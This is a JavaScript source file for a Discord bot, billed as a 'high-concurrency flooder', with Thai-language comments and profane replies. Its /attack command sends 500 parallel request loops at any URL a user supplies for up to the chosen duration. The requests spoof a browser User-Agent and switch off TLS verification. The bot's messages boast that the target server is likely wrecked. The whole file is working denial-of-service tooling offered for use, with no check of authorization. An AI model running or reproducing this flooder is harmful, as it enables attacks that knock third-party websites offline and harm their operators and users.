/**
 * ============================================================================
 * JEFF FUJI - ADVANCED STRESS BOT v2 (HIGH-CONCURRENCY FLOODER)
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const https = require('https');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackIntervals = [];

// ปรับแต่ง Agents ให้รองรับ Connection มหาศาลแบบไม่จำกัด
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเป้าหมายด้วยโหมดแอดวานซ์ (High-Concurrency)')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL เป้าหมาย (เช่น http://example.com)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการยิงทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const targetUrl = interaction.options.getString('url');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการยิงเป้าหมายอื่นอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        try {
            const parsedUrl = new URL(targetUrl);
            const requester = parsedUrl.protocol === 'https:' ? https : http;
            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

            isAttacking = true;
            await interaction.reply(`🚀 **[ADVANCED MODE]** เริ่มส่งพายุ Request ถล่ม **${targetUrl}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const endTime = Date.now() + (duration * 1000);

            // ฟังก์ชันยิงแบบทะลวงไส้ (High-Speed Request Loop)
            const fire = () => {
                if (!isAttacking || Date.now() >= endTime) return;

                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname + parsedUrl.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    },
                    agent: currentAgent
                };

                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => { if (isAttacking) setImmediate(fire); });
                });

                req.on('error', () => { if (isAttacking) setImmediate(fire); });
                req.end();
            };

            // อัดจำนวน Worker พร้อมกันถึง 500 เส้นทาง (กระหน่ำแบบสתอฝา)
            for (let i = 0; i < 500; i++) {
                fire();
            }

            const timer = setTimeout(() => {
                isAttacking = false;
                interaction.followUp(`✅ ภารกิจถล่ม **${targetUrl}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์น่าจะเละไปแล้ว`).catch(() => {});
            }, duration * 1000);

            attackIntervals.push(timer);

        } catch (err) {
            isAttacking = false;
            return interaction.reply({ content: `❌ URL เหี้ยอะไรเนี่ย ผิดรูปแบบ: ${err.message}`, ephemeral: true });
        }

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังยิงอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackIntervals.forEach(t => clearTimeout(t));
        attackIntervals = [];

        await interaction.reply('🛑 สั่งหยุดการยิงทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
